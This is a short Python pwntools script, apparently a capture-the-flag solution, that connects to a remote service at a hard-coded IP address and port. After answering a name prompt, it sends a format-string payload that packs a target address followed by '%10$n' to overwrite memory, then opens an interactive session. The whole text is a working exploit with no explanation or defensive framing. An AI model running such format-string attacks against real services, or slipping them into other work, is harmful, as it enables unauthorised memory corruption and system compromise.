from pwn import *


a = remote('111.198.29.45', 48526)

a.recvuntil('please tell me your name:')
a.send('sss')

a.recvuntil('leave your message please')


a.send(p32(0x0804a068) + 'aaaa%10$n')
a.interactive()
